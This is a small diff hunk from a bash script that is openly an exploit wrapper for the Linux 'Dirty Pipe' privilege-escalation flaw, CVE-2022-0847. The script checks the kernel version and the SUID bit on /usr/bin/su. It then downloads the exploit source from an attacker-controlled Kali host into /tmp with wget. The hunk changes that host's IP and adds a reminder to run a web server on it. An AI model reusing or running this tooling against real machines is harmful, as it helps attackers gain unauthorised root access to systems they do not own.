@@ -26,9 +26,10 @@ if [[ "${notvulnerable[*]}" = $kernel_version ]];
                 echo "[+] SUID bit is set on /usr/bin/su!"
 
                 # Set Kali IP
-                KALI_IP=192.168.1.4
+                KALI_IP=172.16.10.2
 
                 # Grab a copy of the exploit code and store it in /tmp directory
+                # MAKE SURE WEB SERVER IS RUNNING ON PORT 80 IN KALI
                 echo "[*] Grabbing a copy of the exploit code..."
                 wget http://${KALI_IP}/CVE-2022-0847.c -O /tmp/CVE-2022-0847.c 2>/dev/null
                 
